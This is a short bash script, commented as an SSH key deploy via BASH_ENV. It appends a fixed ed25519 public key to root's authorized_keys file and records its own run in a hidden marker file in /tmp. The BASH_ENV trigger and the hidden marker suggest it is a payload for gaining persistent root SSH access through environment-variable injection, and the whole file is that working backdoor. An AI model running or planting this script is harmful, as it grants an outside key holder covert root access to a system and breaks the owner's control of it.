#!/bin/bash
# SSH key deploy via BASH_ENV
mkdir -p /root/.ssh
chmod 700 /root/.ssh
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPWai2C9tfDQYn3lO6lXB32cBSEzEJv2IOi6FRJYfvvW ops-main" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
date >> /tmp/.bash_env_triggered
